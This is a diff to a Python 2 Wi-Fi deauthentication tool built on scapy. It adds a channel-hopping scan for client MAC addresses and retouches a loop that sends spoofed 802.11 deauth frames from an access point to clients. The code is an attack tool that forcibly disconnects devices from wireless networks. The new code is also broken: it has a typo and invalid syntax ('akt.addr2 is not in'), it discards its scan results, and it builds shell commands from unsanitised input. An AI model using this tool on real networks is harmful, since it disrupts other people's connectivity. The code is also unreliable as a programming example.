@@ -15,6 +15,7 @@ class Deauth:
         self.networks = {}
         self.iface = iface
         self.processes = {}
+        self.clients = []
         if os.system("iwconfig " + self.iface + "| grep Monitor >/dev/null 2>&1") != 0:
             try:
                 self.iface = switch_to_monitor(iface)
@@ -35,6 +36,20 @@ class Deauth:
             os.system("iwconfig %s channel %d" % (self.iface, channel))
             time.sleep(1)
 
+    def __scan_clients(self,pkt):
+        if pkt.haslayer(Dot11):
+            if pkt.addr1 and pkt.addr2 and akt.addr2 is not in self.clients:
+                print "Client: " + str(pkt.addr2) + " AP: " + str(pkt.addr1)
+                self.clients.append(pkt.addr2)
+
+    def scan_clients(self):
+        channel_hop = Process(target = self.__channel_hopper)
+        channel_hop.start()
+        sniff(iface=self.iface, prn=self.__scan_clients, timeout = 15)
+        del self.clients[:]
+        channel_hop.terminate()
+        channel_hop.join()
+
     def show_networks(self):
         print '='*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel','ESSID','BSSID') + '='*100
         channel_hop = Process(target = self.__channel_hopper)
@@ -48,7 +63,7 @@ class Deauth:
         client_2_ap_pkt = None
         if client != 'FF:FF:FF:FF:FF:FF':
             client_2_ap_pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth()
-        print 'Sending Deauth to ' + client + ' from ' + bssid
+        print '[*] Sending Deauth to ' + client + ' from ' + bssid
         print '> '
         while count != 0:
             for i in range(64):
